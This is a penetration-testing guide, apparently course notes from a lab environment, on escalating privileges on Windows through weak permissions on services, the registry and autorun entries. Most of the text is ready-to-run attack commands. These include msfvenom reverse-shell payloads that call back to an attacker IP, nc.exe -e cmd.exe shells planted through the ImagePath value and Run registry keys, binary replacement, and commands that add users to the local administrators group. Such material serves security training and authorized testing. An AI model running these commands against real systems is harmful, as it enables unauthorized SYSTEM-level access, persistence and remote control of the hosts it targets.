## Weak Permissions

Service-related misconfigurations are among the most reliable privilege escalation paths on Windows because services almost universally run as `SYSTEM` or an elevated account. There are four distinct classes of weak permission: writable service binary, writable service config, unquoted service path, and weak registry ACLs. Each requires a different approach but all lead to the same outcome. 

***

## Enumeration Tools

Always start with automated scanning, then verify manually with `icacls` and `accesschk`:

```powershell
# SharpUp - GhostPack, checks all four categories
.\SharpUp.exe audit

# PowerUp - PowerSploit module
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# winPEAS - comprehensive automated check
.\winPEASx64.exe

# Manual: list all non-system auto-start services in one shot
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

***

## Class 1: Writable Service Binary (Weak File ACL)

The service binary itself has world-writable permissions. You replace it with a malicious executable. 
```powershell
# SharpUp identifies the vulnerable service
.\SharpUp.exe audit
# === Modifiable Service Binaries ===
# Name: SecurityService
# PathName: "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Confirm with icacls
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
# BUILTIN\Users:(I)(F)  <- Full control for all users = vulnerable
# Everyone:(I)(F)

# Dangerous ACL entries to look for:
# (F) = Full Control
# (W) = Write
# (M) = Modify
# Any of these for BUILTIN\Users, Everyone, or Authenticated Users = exploitable

# Check the parent directory too - write access to the dir is enough
icacls "C:\Program Files (x86)\PCProtect\"
```

```bash
# Generate replacement binary on attack machine
# Option 1: Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe -o SecurityService.exe

# Option 2: Add user to local admins
msfvenom -p windows/x64/exec CMD='net localgroup administrators hacker /add' -f exe -o SecurityService.exe
```

```cmd
:: Backup original binary
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" "C:\Windows\Temp\SecurityService.exe.bak"

:: Replace with malicious binary
copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

:: Start the service (set up listener first if using reverse shell)
sc start SecurityService

:: Cleanup: restore original
sc stop SecurityService
copy /Y "C:\Windows\Temp\SecurityService.exe.bak" "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

***

## Class 2: Writable Service Config (Weak Service ACL)

You cannot modify the binary, but you have write access to the service configuration itself via the SCM. You change what binary the service points to. 

```cmd
:: Identify vulnerable service with SharpUp
SharpUp.exe audit
:: === Modifiable Services ===
:: Name: WindscribeService

:: Verify with accesschk - look for SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
accesschk.exe /accepteula -quvcw WindscribeService
:: RW NT AUTHORITY\Authenticated Users -> SERVICE_ALL_ACCESS = exploitable

:: Scan all services for the current user
accesschk.exe /accepteula -uwcqv %USERNAME% *
:: Or for common groups:
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *

:: Dangerous permission flags:
:: SERVICE_ALL_ACCESS        = full control
:: SERVICE_CHANGE_CONFIG     = can change binary path (the key one)
:: WRITE_DAC                 = can change ACL (then grant yourself full control)
:: GENERIC_WRITE             = inherits SERVICE_CHANGE_CONFIG
```

```cmd
:: Exploit: change the binary path
sc config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"
:: Note: space after binpath= is required

:: Stop and start service (service fails to start but command runs)
sc stop WindscribeService
sc start WindscribeService
:: [SC] StartService FAILED 1053 <- expected, command still executes

:: Confirm result
net localgroup administrators

:: Cleanup: restore original path
sc config WindscribeService binpath= "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindscribeService
sc query WindscribeService
```

### Service Permission Reference

| Permission Flag | Meaning |
|---|---|
| `SERVICE_ALL_ACCESS` | Full control |
| `SERVICE_CHANGE_CONFIG` | Change binary path and other config |
| `SERVICE_START` | Start the service |
| `SERVICE_STOP` | Stop the service |
| `WRITE_DAC` | Modify the service ACL |
| `WRITE_OWNER` | Take ownership of service config |

***

## Class 3: Unquoted Service Path

When a service binary path contains spaces and is not enclosed in quotes, Windows interprets each space as a potential binary boundary and tries each combination in order before finding the real executable. 
```
Path: C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

Windows tries these in order:
1. C:\Program.exe
2. C:\Program Files.exe           <- not valid path but tried
3. C:\Program Files (x86)\System.exe   <- if this exists, it runs as SYSTEM
4. C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

```cmd
:: Find all unquoted auto-start service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

:: PowerShell version (cleaner output)
Get-WmiObject Win32_Service | Where-Object {
    $_.StartMode -eq "Auto" -and
    $_.PathName -notmatch '^"' -and
    $_.PathName -notmatch "C:\\Windows\\"
} | Select-Object Name, PathName

:: Verify you can write to one of the hijack locations
icacls "C:\Program Files (x86)\System Explorer\"
:: If BUILTIN\Users or Everyone has (W) or (F) -> exploitable

accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\System Explorer\"
:: Look for write access in the directory
```

```bash
# Generate payload named to match the hijack point
# If C:\Program Files (x86)\System.exe is the target:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe -o System.exe
```

```cmd
:: Place the malicious binary at the hijack point
copy System.exe "C:\Program Files (x86)\System.exe"

:: Restart the service (wait for system restart if no stop/start rights)
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService

:: Cleanup
del "C:\Program Files (x86)\System.exe"
```

***

## Class 4: Weak Registry Service ACLs

The registry key controlling the service has write permissions for low-privilege users. You modify `ImagePath` directly: 

```cmd
:: Scan registry service keys for current user write access
accesschk.exe /accepteula %USERNAME% -kvuqsw hklm\System\CurrentControlSet\services

:: Output to look for:
:: RW HKLM\System\CurrentControlSet\services\ModelManagerService
::     KEY_ALL_ACCESS  <- exploitable
```

```powershell
# Modify ImagePath to point to a reverse shell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" `
    -Name "ImagePath" `
    -Value "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.3 8443"

# Or add admin user
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" `
    -Name "ImagePath" `
    -Value "cmd /c net localgroup administrators htb-student /add"

# Trigger by restarting the service
sc stop ModelManagerService
sc start ModelManagerService
```

***

## Class 5: Modifiable Autorun Binaries

Autorun entries execute when a user logs in. If the binary in the autorun entry is world-writable, replace it and wait for the target user to log in: 

```powershell
# Find all autorun entries
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List

# Manual registry check
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check write permissions on an autorun binary
icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"
accesschk.exe /accepteula -quv "C:\Program Files (x86)\Windscribe\Windscribe.exe"

# If writable, replace the binary
copy /Y malicious.exe "C:\Program Files (x86)\Windscribe\Windscribe.exe"
# Wait for target user to log in -> binary executes in their context

# If registry key itself is writable, redirect to your binary
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Windscribe /t REG_SZ /d "C:\Windows\Temp\nc.exe -e cmd 10.10.14.3 8443" /f
```

***

## Full Weak Permissions Check Flow

```
.\SharpUp.exe audit
         |
         v
=== Modifiable Service Binaries? ===
  YES -> icacls <binary_path>
         BUILTIN\Users:(F) or Everyone:(F)? -> Replace binary -> sc start <service>

=== Modifiable Services? ===
  YES -> accesschk.exe -quvcw <service>
         SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG?
         -> sc config <service> binpath= "<payload>" -> sc stop/start

=== Unquoted paths? ===
  YES -> wmic service get name,pathname,startmode | findstr /v """"
         -> icacls on each space-delimited directory
         -> Write access? -> drop payload at hijack location -> wait for restart

=== Registry ACLs? ===
  YES -> accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services
         KEY_ALL_ACCESS? -> Set-ItemProperty ImagePath -> sc restart

=== Autorun binaries? ===
  Get-CimInstance Win32_StartupCommand
  icacls on each binary
  Write access? -> Replace binary -> wait for login
```
